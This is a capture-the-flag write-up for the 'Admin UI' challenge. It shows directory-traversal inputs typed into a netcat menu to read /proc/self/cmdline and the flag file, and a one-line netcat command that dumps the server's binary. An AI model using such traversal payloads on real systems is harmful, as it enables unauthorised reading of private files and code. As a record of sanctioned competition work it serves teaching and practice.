**Challenge: Admin UI**

Another PWN-RE!

As challenge says, we use netcat to connect:

>$ nc -v mngmnt-iface.ctfcompetition.com 1337

When we connect we are presented with some options...

> === Management Interface ===<br/>
> 1) Service access<br/>
> 2) Read EULA/patch notes<br/>
> 3) Quit<br/>
> <br/>

We also get a prompt. So lets play and see whats up. If we press 1 we are asked for a password. Try some :) 

> Please enter the backdoo^Wservice password:<br/>
> password<br/>
> Incorrect, the authorities have been informed!<br/>

Well, better watch that VPN :) If we select 2 things get weird quickly. We are also presented with a choice but it isnt a Menu like
before and you still have some input...

> The following patchnotes were found:<br/>
>  - Version0.3<br/>
>  - Version0.2<br/>
> Which patchnotes should be shown?<br/>

So we are asked to TYPE the version of the patchnotes. Hmm.. Lets try to type Version0.3. We get some random message that it got rolled
back to Version0.2 and if we read that patchnotes we see they fixed a "traversal bug". Nice.

Lets see what we can find via directory traversal attack:

> Which patchnotes should be shown?<br/>
> ./Version0.3<br/>
> #Version 0.3<br/>

Clear as day. It is as you ran the program. So we have a full directory traversal at our disposal. We need or orientate.

Path travrsal in linux is like this ../../ so you basically go to the top or anywhere. But reaching the top directories is great 
because then we have access to things like proc which we can use to get a lot of information. After playing around a bit and counting,
I got:

> Which patchnotes should be shown?<br/>
> ../../../../../../../../../../../proc/self/cmdline<br/>
> ./main=== Management Interface ===<br/>

Woah, "./main"! Bingo. That is our binary. So flag must be here somewhere but we can also get the binary via netcat.
Lets first try to find the flag. If we assume it is in the same directory as the "main" binary, we can just do:

> Which patchnotes should be shown?<br/>
> ../flag<br/>
> CTF{I_luv_buggy_sOFtware}=== Management Interface ===<br/>
>  1) Service access<br/>
>  2) Read EULA/patch notes<br/>
>  3) Quit<br/>

And here if our flag!

Now, lets dump the binary. We might need it. We will also use Netcat. We will just use it like this: First echo the 2 command to enter
the patchnotes and then pipe the main binary into netcat and dump it as main.

> $ echo -e "2\n../main" | nc -v mngmnt-iface.ctfcompetition.com 1337 > main<br/>
> DNS fwd/rev mismatch: mngmnt-iface.ctfcompetition.com != 31.49.195.35.bc.googleusercontent.com<br/>
> mngmnt-iface.ctfcompetition.com [35.195.49.31] 1337 (?) open<br/>
> <br/>

You will still be on the server but after 5sec or so since binary is small you can CtrlZ to exit and you will see the dumped main
binary in your folder. But since we used traversal and the menu from the server, we will need to clean up the binary a bit.
Open it in HEX editor and you will see the garbage. Search where ELF header begins, it is close.
To make it easier, from the start you need to remove 182 bytes up to 7F 45 4C 46.  Then just save the binary.


